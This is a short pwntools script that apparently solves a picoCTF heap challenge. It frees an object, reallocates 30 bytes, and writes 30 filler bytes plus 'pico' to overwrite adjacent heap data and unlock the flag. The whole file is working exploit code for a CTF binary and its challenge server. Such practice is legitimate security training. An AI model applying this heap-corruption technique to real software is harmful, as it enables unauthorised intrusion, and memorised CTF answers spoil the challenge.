from pwn import * 

exe = ELF("./chall")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tethys.picoctf.net", 64177)

    return r

def main():
	r = conn()
	input()
	r.sendlineafter(b'Enter your choice: ', b'5')
	r.sendlineafter(b'Enter your choice: ', b'2')
	r.sendlineafter(b'Size of object allocation: ', b'30')
	payload = b'A'*30 + b'pico'
	r.sendlineafter(b'Data for flag: ', payload)
	r.sendlineafter(b'Enter your choice: ', b'4')
	# pause()
	r.interactive()
if __name__ == "__main__":
	main()